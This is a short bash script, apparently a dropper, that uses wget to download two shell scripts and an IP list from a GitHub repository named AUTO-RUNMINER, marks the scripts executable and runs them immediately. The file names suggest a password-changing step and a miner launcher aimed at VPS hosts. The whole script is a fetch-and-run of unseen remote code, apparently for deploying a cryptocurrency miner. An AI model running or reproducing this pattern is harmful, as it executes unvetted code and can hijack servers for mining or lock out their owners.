#!/bin/bash

UBAHPASS="https://raw.githubusercontent.com/DotAja/AUTO-RUNMINER/refs/heads/main/newVPS/gantipass.sh"
JALANKAN="https://raw.githubusercontent.com/DotAja/AUTO-RUNMINER/refs/heads/main/newVPS/jalankan.sh"
URLIP="https://raw.githubusercontent.com/DotAja/AUTO-RUNMINER/refs/heads/main/newVPS/ipbaru.sh"

wget -q -O GAN $UBAHPASS
wget -q -O LUN $JALANKAN
wget -q -O ips.txt $URLIP

chmod +x GAN
chmod +x LUN

./GAN
./LUN
